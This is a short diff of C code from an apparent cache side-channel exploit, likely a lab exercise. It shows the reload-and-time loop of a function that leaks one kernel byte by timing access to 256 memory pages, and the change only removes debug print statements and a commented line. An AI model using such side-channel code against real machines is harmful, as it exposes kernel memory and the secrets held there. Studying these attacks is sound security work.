@@ -54,7 +54,6 @@ static unsigned char leak_one_byte_part2(int kernel_fd, char *shared_memory, siz
         // RELOAD 
         for (int i = 0; i < 256; i++) {
             int mix_i = ((i * 167) + 13) & 255; // mixed order to counter prefetching optimization
-            //char *addr = &shared_memory[mix_i * 4096];
             uint64_t dt = time_access(&shared_memory[mix_i * 4096]); // measure access time to mix_i-th page
             access_times[mix_i] = dt;
             if (dt < THRESHOLD) {
@@ -69,9 +68,7 @@ static unsigned char leak_one_byte_part2(int kernel_fd, char *shared_memory, siz
         if (candidates[i] > candidates[best]) {
             best = i;
         }
-        printf("\nCandidacy of %d:%d | Time: %d", i, candidates[i], access_times[i]);
     }
-    printf("\nBest candidate: %d - Value: %d | Time: %d\n", best, candidates[best], access_times[best]);
     return (unsigned char)best;
 }
 
